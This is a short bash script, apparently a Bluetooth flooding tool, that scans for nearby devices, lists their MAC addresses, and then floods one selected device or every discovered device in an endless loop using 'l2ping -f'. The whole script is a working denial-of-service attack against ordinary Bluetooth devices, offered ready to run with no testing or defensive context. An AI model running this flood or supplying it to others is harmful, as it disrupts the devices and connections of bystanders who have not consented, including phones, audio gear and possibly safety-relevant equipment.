#!/bin/bash

rm -f /tmp/scan.txt /tmp/macs.txt > /dev/null

function cleanup() {
	killall l2ping
	killall bluetooth-flood.sh
	exit 0
}

trap cleanup SIGINT SIGTSTP

sudo systemctl restart bluetooth # Restarts the bluetooth service to avoid hcitool errors
sleep 2
sudo rfkill unblock bluetooth # Unlock bluetooth if rfkill disables it (useful for external bluetooth adapters)
sudo btmgmt --index $INTERFACE_BT power on # Power on the interface

echo -e "\nScanning...\n"
sudo btmgmt --index $INTERFACE_BT find | tee /tmp/scan.txt # Start the scan

# Format everything
echo -e "\n"
awk '
/dev_found/ {
    if (mac) {
        printf "%-20s %-10s %-5s %-30s\n", mac, type, rssi, name
    }
    mac = $3;
    type = $5;
    name = "(not available)"; # Default name
    rssi = "N/A";            # Default RSSI
    for (i = 6; i <= NF; i++) {
        if ($i == "rssi") {
            rssi = $(i+1);
            break;
        }
    }
}
/name/ {
    sub(/^name /, "");
    name = $0;
}
END {
    if (mac) {
        printf "%-20s %-10s %-5s %-30s\n", mac, type, rssi, name
    }
}' /tmp/scan.txt | sort -k3 -nr

grep "dev_found" /tmp/scan.txt | awk '{print $3}' > /tmp/macs.txt
echo -e "\nMACs formatted\n"

read -p "flood mode? (1: Flood selected mac | 2: Flood all): " flood_mode

if [ "${flood_mode}" = "1" ]; then
	read -p "MAC address?: " mac
	echo -e "\nPress ctrl+c to stop the flood\n"
	sleep 0.5
	sudo l2ping -f "$mac"

elif [ "${flood_mode}" = "2" ]; then 
	echo -e "\nPress ctrl+c to stop the flood\n"
	sleep 0.5
	while true; do
		while IFS= read -r mac; do
			echo "Flooding $mac..."
			timeout 10 sudo l2ping -f "$mac"
		done < /tmp/macs.txt
	done

else
	echo "Invalid mode."
	exit 1
fi
